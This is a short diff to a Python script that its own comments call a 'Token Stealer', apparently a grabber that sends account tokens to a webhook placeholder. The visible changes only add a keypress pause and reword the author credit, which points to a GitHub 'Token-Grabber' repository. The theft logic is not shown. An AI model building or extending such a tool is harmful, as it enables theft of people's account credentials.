@@ -2,7 +2,7 @@
 import os
 import re
 import json
-
+import msvcrt
 from urllib.request import Request, urlopen
 
 WEBHOOK_URL = 'YourWebhook'
@@ -90,5 +90,7 @@ def main():
 if __name__ == '__main__':
     main()
 
-#Token Stealer Made By GotDoxed#2321
+msvcrt.getch()
+
+# Developed By: GotDoxed#2321
 #GitHub = https://github.com/LukeMine/Token-Grabber-
